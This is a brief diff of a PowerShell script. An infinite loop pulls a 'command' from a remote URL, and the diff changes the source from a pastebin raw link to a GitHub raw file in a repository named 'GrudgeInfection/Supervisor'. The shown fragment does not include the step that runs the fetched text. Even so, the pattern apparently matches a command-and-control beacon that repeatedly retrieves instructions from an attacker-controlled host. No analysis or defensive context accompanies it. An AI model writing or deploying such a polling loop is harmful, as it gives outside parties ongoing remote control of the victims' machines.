@@ -1,6 +1,6 @@
 while ($true) {
     try {
-        $command = (curl "pastebin.com/raw/3ywifLXS").Content
+        $command = (curl "https://raw.githubusercontent.com/GrudgeInfection/Supervisor/refs/heads/main/command").Content
     }
     catch {
         Write-Error "Error retrieving command: $($_.Exception.Message)"
